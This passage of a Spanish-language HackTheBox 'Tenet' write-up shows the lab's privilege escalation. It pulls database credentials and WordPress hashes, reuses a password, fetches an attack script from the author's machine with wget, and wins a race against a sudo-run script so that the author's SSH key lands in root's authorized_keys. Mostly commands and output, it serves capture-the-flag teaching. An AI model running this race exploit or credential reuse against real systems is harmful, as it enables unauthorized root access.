<p>Enumerando con <code>linpeas.sh</code> vemos unas credenciales del usuario <code>neil</code> hacia una base de datos y que <code>www-data</code> puede ejecutar ese archivo como usuario <code>root</code>:</p>

<pre><code class="language-php">...
[+] Searching Wordpress wp-config.php files
wp-config.php files found:
/var/www/html/wordpress/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'neil' );
define( 'DB_PASSWORD', 'Opera2112' );
define( 'DB_HOST', 'localhost' );
...
...
...
User www-data may run the following commands on tenet:¬∑
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
...
</code></pre>

<p>Si validamos que servicios est√° corriendo localmente vemos la base de datos:</p>

<pre><code class="language-bash">www-data@tenet:/dev/shm$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
tcp        0      0 localhost.localdo:mysql 0.0.0.0:*               LISTEN
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
tcp6       0      0 [::]:http               [::]:*                  LISTEN
udp        0      0 localhost:domain        0.0.0.0:*
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     SEQPACKET  LISTENING     14311    /run/udev/control
...
</code></pre>

<ul>
  <li>mysql -&gt; <code>neil</code>:<code>Opera2112</code>.</li>
</ul>

<p>Entonces probemos:</p>

<pre><code class="language-bash">www-data@tenet:/dev/shm$ mysql -u neil -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 7
Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; 
</code></pre>

<p>Perfe, pues enumeremos la base de datos:</p>

<pre><code class="language-bash">mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.00 sec)

mysql&gt; use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql&gt; 
</code></pre>

<p>Veamos la tabla <code>wp_users</code>:</p>

<pre><code class="language-bash">mysql&gt; SELECT * FROM wp_users;
+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login  | user_pass                          | user_nicename | user_email            | user_url                     | user_registered     | user_activation_key | user_status | display_name |
+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
|  1 | protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. | protagonist   | protagonist@tenet.htb | http://10.10.10.44/wordpress | 2020-12-16 12:17:10 |                     |           0 | protagonist  |
|  2 | neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. | neil          | neil@tenet.htb        | http://tenet.htb             | 2020-12-16 14:51:26 |                     |           0 | neil neil    |
+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
2 rows in set (0.00 sec)

mysql&gt; 
</code></pre>

<p>Tenemos dos hashes, para validar que tipo son, nos apoyamos de <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">los ejemplos que tiene <code>hashcat</code></a>.</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309google_hashcat_examples.png" alt="309google_hashcat_examples" /></p>

<p>Los hashes son tipo <code>phpass, WordPress (MD5), Joomla (MD5)</code>. Veamos si los podemos crackear con <code>rockyou.txt</code>:</p>

<p><strong>PEEEEEEEEEEEERO ANTES</strong>, intentemos ingresar con la cuenta <code>neil</code> y la contrase√±a <code>Opera2112</code> a su sesi√≥n en la m√°quina, por probar, antes de quemar nuestra RAM (:</p>

<pre><code class="language-bash">www-data@tenet:/var/www/html$ su neil
Password: 
neil@tenet:/var/www/html$ cd 
neil@tenet:~$ id
uid=1001(neil) gid=1001(neil) groups=1001(neil)
neil@tenet:~$ 
</code></pre>

<p>Pues si, para evitar quemarnos la cabeza con otros temas :P (Ya me ha pasado en varias m√°quinas).</p>

<p>‚Ä¶</p>

<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>

<p>Ac√° entra en juego el archivo que encontramos mediante <code>linpeas.sh</code>:</p>

<pre><code class="language-bash">neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
neil@tenet:~$ 
</code></pre>

<p>Podemos ejecutar el script como usuario administrador del sistema empleando <code>sudo</code>, solo que ahora con <code>neil</code>. Veamos su contenido:</p>

<pre><code class="language-bash">#!/bin/bash

checkAdded() {
        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
                /bin/echo "Successfully added $sshName to authorized_keys file!"
        else
                /bin/echo "Error in adding $sshName to authorized_keys file!"
        fi
}

checkFile() {
        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1
        fi
}

addKey() {
        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
        (umask 110; touch $tmpName)
        /bin/echo $key &gt;&gt;$tmpName
        checkFile $tmpName
        /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys
        /bin/rm $tmpName
}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"

addKey
checkAdded
</code></pre>

<p>Bien, tenemos:</p>

<ol>
  <li>Crea un archivo en <code>/tmp</code> con nombre <code>ssh-*</code> (el <code>*</code> significa que puede ser cualquier nombre),</li>
  <li>despues almacena el valor de la variable <code>$key</code> (que en este caso tiene la llave p√∫blica del usuario root de la m√°quina) en ese archivo temporal,</li>
  <li>verifica que el archivo se haya creado y tenga contenido, si hay error lo borra. (Mira <a href="https://linuxize.com/post/bash-if-else-statement/">estos recursos</a> sobre <a href="https://ryanstutorials.net/bash-scripting-tutorial/bash-if-statements.php#if">declaraciones en IF bash</a>).</li>
  <li>Ahora toma el contenido del archivo y lo agrega al objeto <code>/root/.ssh/authorized_keys</code>; esto con el fin de no tener que ingresar contrase√±a en el caso del usuario <code>root@ubuntu</code> con esa llave p√∫blica y la llave privada relacionada. (M√°s <a href="https://www.ssh.com/ssh/authorized_keys/">info ac√°</a> y <a href="https://www.uv.es/~sto/articulos/BEI-2003-01/ssh_np.html">tambi√©n ac√°</a> sobre el archivo <strong>/.ssh/authorized_keys</strong>.)</li>
  <li>Borra el archivo temporal y v√°lida que efectivamente se haya agregado la llave.</li>
</ol>

<p>Listos, ya que sabemos que hace el script y porque lo hace, podemos aprovecharnos de esto de una manera muy sencilla.</p>

<p>Sabemos que se crean archivos temporales cada vez que ejecutamos el script, pero que a la vez se borran superr√°pido. Entonces podemos armarnos otro script en el que le pasemos <strong>nuestra llave publica</strong> a cualquier archivo que est√© creado sobre la carpeta <code>/tmp</code> y que empiece con el nombre <code>ssh-</code>. Esto para poder simplemente ingresar a la m√°quina sin necesitar contrase√±a. Ya que le estamos diciendo que nos guarde nuestra identidad <strong>p√∫blica</strong> en su m√°quina y como en este caso lo guarda en la ruta del usuario administrador, podr√≠amos ingresar como <code>root</code>.</p>

<ul>
  <li>SSH Keys - <a href="https://wiki.archlinux.org/index.php/SSH_keys_(Espa%C3%B1ol)">archlinux.org</a></li>
</ul>

<p>Primero veamos como generar nuestras llaves:</p>

<pre><code class="language-bash">‚Äì¬ª ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /.ssh/id_rsa
Your public key has been saved in /.ssh/id_rsa.pub
The key fingerprint is:
SHA256:LWUMikKpuLYON5XF4vAcInU0kG4YR72yxCWpuLs9urg lanz@lanz
The key's randomart image is:
+---[RSA 3072]----+
| .*B*   .        |
| o+= * . o       |
|+oB * =   +      |
|=+ @ *   +       |
|.o. O   S .      |
|o. o     .       |
|o.+              |
|++..             |
|E*..             |
+----[SHA256]-----+
¬∑ ~/.ssh ¬∑
‚Äì¬ª ls
id_rsa  id_rsa.pub
</code></pre>

<p>Perfecto, nos genera las 2 llaves, una <strong>p√∫blica</strong> y otra <strong>privada</strong>.</p>

<blockquote>
  <p>Las llaves de SSH siempre son generadas en pares con una llamada llave privada y otra llamada llave p√∫blica. La llave privada solo es conocida por el usuario y debe ser guardada con cuidado. En contraste, la llave p√∫blica puede ser compartida libremente con cualquier servidor SSH con el que se quiere conectar. <a href="https://wiki.archlinux.org/index.php/SSH_keys_(Espa%C3%B1ol)#Informacion_preliminar">ArchLinux.org</a></p>
</blockquote>

<p>Nosotros necesitaremos la llave p√∫blica, porque como cit√© anteriormente: ‚Äúla llave p√∫blica puede ser compartida libremente con cualquier servidor SSH con el que se quiere conectar‚Äù</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309bash_idrsaPUB.png" alt="309bash_idrsaPUB" /></p>

<p>Ahora creemos el script, lo llamar√© <code>rounded.sh</code>:</p>

<pre><code class="language-bash">#!/bin/bash

keyy="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCo9T2TnGWh+/2D876RYO1Wd08WkOJGFSL1oSu/loc0Khb0U/Ou8gwj8+NyFq0E5SuPIWHDtogg00/KOrzmFLwMza+oN5HumhHBeNgJvF4IxU3LmHciLWjHpCDXQvJf1FmazIVGuvXlNEuuEHV2TBO2R8H+2jO4GHVHB57dFci87StQoPU9V8fs0NXnieCkOvFH3gESWlbeDj8h0O7mYpjvdGNFgbvlpvKe3zhxrB9al5CPYFcMy4Zv0TXT+tRYjU1jKUJX8WaxNzDDdKhnp68N5BuDMlxkyNdRSlQUQIJcfglRdubLOre4r7SYpNBhWUI6IowMHvDXcw7+zGmtqAUqTjsm0whlRrNxGlsEHdLUA/EPu+wlcVlk9f9uGugTE7LTJxbYXPe96xc+xVL3T3Ciq6fz/aj0cBkIpwKsGLCyFKOceWrtrSu+f7KZCBODXMiKfxNF6wMZusDzN8VMWc6NY1SF0WE3UPcG+PNsBfQuIagiLXi40/lVOZoH7A7U1Xk= lanz@lanz"

while true
do
  echo $keyy | tee /tmp/ssh-*
done
</code></pre>

<p>Con <code>tee</code> le indicamos que reemplace el contenido del archivo <code>/tmp/ssh-LOQUESEA</code> con lo que le pasemos, en este caso nuestra llave. Cuando lo haga nos mostrara el output. As√≠ que en vez de guardar la del usuario <code>root@ubuntu</code> guardar√≠a la de <code>lanz@lanz</code>. Veamos un ejemplo sencillo:</p>

<pre><code class="language-bash">‚Äì¬ª cat pub_test 
ssh-rsa sssssssssssssssssssssssssdddddddddddddddddddddddddddddddddddd= jorge@root

‚Äì¬ª echo "ssh-rsa ESTAESAHORALAllavePUBLICAqueVAM0S4AGREGARr= jorge?@sijorge" | tee pub_test 
ssh-rsa ESTAESAHORALAllavePUBLICAqueVAM0S4AGREGARr= jorge?@sijorge

‚Äì¬ª cat pub_test 
ssh-rsa ESTAESAHORALAllavePUBLICAqueVAM0S4AGREGARr= jorge?@sijorge
</code></pre>

<p>Listo, pues d√©mosle, subamos el script a la m√°quina:</p>

<pre><code class="language-bash">‚Äì¬ª python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</code></pre>

<pre><code class="language-bash">neil@tenet:/dev/shm$ wget http://10.10.14.226:8000/rounded.sh
neil@tenet:/dev/shm$ chmod +x rounded.sh 
neil@tenet:/dev/shm$ ls -la
total 4
drwxrwxrwt  2 root root   60 Jan 19 18:07 .
drwxr-xr-x 17 root root 3780 Jan 19 14:51 ..
-rwxrwxr-x  1 neil neil  633 Jan 19 17:42 rounded.sh
neil@tenet:/dev/shm$ ./rounded.sh
...
</code></pre>

<p>Debemos ser r√°pidos, ya que borra el archivo casi inmediatamente‚Ä¶ Pero bueno, ya lo tenemos en la m√°quina, aprovechemos que tenemos la contrase√±a del usuario <code>neil</code> para entrar mediante <code>SSH</code> a su sesi√≥n y desde ah√≠ ejecutar <code>sudo /usr/local/bin/enableSSH.sh</code>.</p>

<pre><code class="language-bash">‚Äì¬ª ssh neil@10.10.10.223
neil@10.10.10.223's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
...
neil@tenet:~$ 
</code></pre>

<p>Para ejecutar el archivo continuamente a la vez que intentamos inyectarlo podemos hacer un one-liner empleando un ciclo <code>for</code> que corra 5000 veces :P</p>

<pre><code class="language-bash">neil@tenet:/dev/shm$ for i in {1..5000}; do sudo /usr/local/bin/enableSSH.sh; done
Successfully added root@ubuntu to authorized_keys file!
Successfully added root@ubuntu to authorized_keys file!
...
</code></pre>

<p>Despues de probar y probar, vi que algo extra√±o estaba pasando en la sesi√≥n que conseguimos mediante la web, ya que no ten√≠amos el mismo output en ninguna sesi√≥n en cuanto a los archivos de la ruta <code>/tmp</code>:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309bash_neil_tmpTrouble.png" alt="309bash_neil_tmpTrouble" /></p>

<p>As√≠ que lo m√°s sencillo es quitarnos esa sesi√≥n y abrir otras con el usuario <code>neil</code> ya desde <strong>SSH</strong> :)</p>

<p>‚Ä¶</p>

<p>Ahora simplemente nos queda:</p>

<ul>
  <li>Ejecutar el script que agrega nuestra llave en una sesi√≥n,</li>
  <li>en otra ejecutamos el bucle <code>for</code> llamando al archivo <code>/usr/local/bin/enableSSH.sh</code> y</li>
  <li>finalmente probar nuestro acceso hacia la m√°quina, ser√≠a as√≠:</li>
</ul>

<pre><code class="language-bash">‚Äì¬ª ssh root@10.10.10.223
</code></pre>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309bash_rootSH.png" alt="309bash_rootSH" /></p>

<p>Y listos, tamos dentro de la m√°quina. Solo nos quedar√≠a ver las flags (:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309flags.png" alt="309flags" /></p>

<p>‚Ä¶</p>

<p>La explotaci√≥n de objetos PHP me encanto, adem√°s de ser la primera vez que experimentaba con esa vulnerabilidad. El privesc fue m√°s un juego :S no me gusto tanto, pero pues la idea esta buena y creo que si alcanzo a imagin√°rmelo en alguna computadora por ah√≠ en el mundo :P</p>

<p>Muchas gracias por pasarse por ac√° y leerse todo este conjunto de ideas, que tengas una feliz noche y a seguir rompiendo todooooooooooooooo.</p>

</div>

<!-- Rating -->


<!-- Author Box if enabled from _config.yml -->
<!-- Author Box -->




<!-- Comments if not disabled with comments: false -->
<!-- Comments
================================================== -->
 
<div class="comments">
    <button class="btn btn-dark show-comments">Comentarios</button>         
    <div id="comments">  
        <h4 class="mb-4">Comments</h4>                 
            <section class="disqus">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = 'demowebsite'; 
        var disqus_developer = 0;
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</section>
     
    <div class="clearfix"></div>              
    </div>    
</div>       


<!-- Share -->
<div class="share">
    <p>
        Vacios
    </p>
    <ul>
        <li class="ml-1 mr-1">
            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Tenet&url=http://localhost:4000/htb/tenet" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                <i class="fab fa-twitter"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
                <i class="fas fa-cube"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
                <i class="fab fa-github"></i>
            </a>
        </li>

    </ul>
</div>


<!-- Related Post -->
<!-- Related Posts
================================================== -->
<div class=" related-posts ">  

    
    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
    
    
    <div class="d-flex justify-content-center align-items-center">

    <!-- Tags -->  
    
                    
    <a class="smoothscroll badge badge-primary" href="/tags#code-analysis">code-analysis</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#deserialization">deserialization</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#race-condition">race-condition</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#ssh-keys">ssh-keys</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#wordpress">wordpress</a>               
    
    
    <!-- Categories -->
    
    
    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
    

    </div>

    
    
    
    <div class="blog-grid-container">
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/htb/unobtainium">
                

                    
                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338banner.png" alt="HackTheBox - Unobtainium"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/htb/unobtainium">HackTheBox - Unobtainium</a>
                
            </h2>
            <h4 class="card-text">M√°quina Linux nivel dif√≠cil. Explotaremos una app de Linux. Jugando con librer√≠as de JavaScript, la infectaremos (Prototype Pollution en lodash) y haremos command-injection (en google-cloudstorage-commands). Y moveremos internamente muchas cosas...</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
                
                </span>
                <span class="author-meta">
                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
                
                <span class="post-date">30 Aug 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/htb/proper">
                

                    
                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321banner.png" alt="HackTheBox - Proper"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/htb/proper">HackTheBox - Proper</a>
                
            </h2>
            <h4 class="card-text">M√°quina Windows nivel dif√≠cil. Agregamos sal a nuestra inyecci√≥n SQL, jugaremos a ganar la race condition y finalmente entre reversing, movimiento lateral, creaci√≥n de scripts en PowerShell y pipes conseguiremos...</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
                
                </span>
                <span class="author-meta">
                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
                
                <span class="post-date">21 Aug 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/htb/waldo">
                

                    
                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149banner.png" alt="HackTheBox - Waldo"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/htb/waldo">HackTheBox - Waldo</a>
                
            </h2>
            <h4 class="card-text">M√°quina linux nivel medio. Los lindos LFI, jugueteo con SSH, llaves privadas traviesas, bypass de shells restringidas yyyyyy cositas con las CAPAcidades BILITIESas.

</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
                
                </span>
                <span class="author-meta">
                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
                
                <span class="post-date">09 Aug 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
                
        </div>        
</div>

<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
https://search.google.com/structured-data/testing-tool/u/0/
================================================== -->

    </div>

    
    <!-- Newsletter
    ================================================== -->
    <div class="newsletter text-center">
        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
        <p></p>
    </div>
    
    
</div>

<!-- Begin Footer
================================================== -->
<footer class="footer">
    <div class="container">
        <div class="row">
            <div class="col-md-6 col-sm-12 text-center text-lg-left">
                Copyright ¬© 2022 Sh0x blog 
            </div>
            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
            </div>
        </div>
    </div>
</footer>
<!-- End Footer
================================================== -->

</div> <!-- /.site-content -->

<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
================================================== -->

<script src="/assets/js/prism.js"></script>

<script src="/assets/js/theme.js"></script>




<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>


</body>
</html>
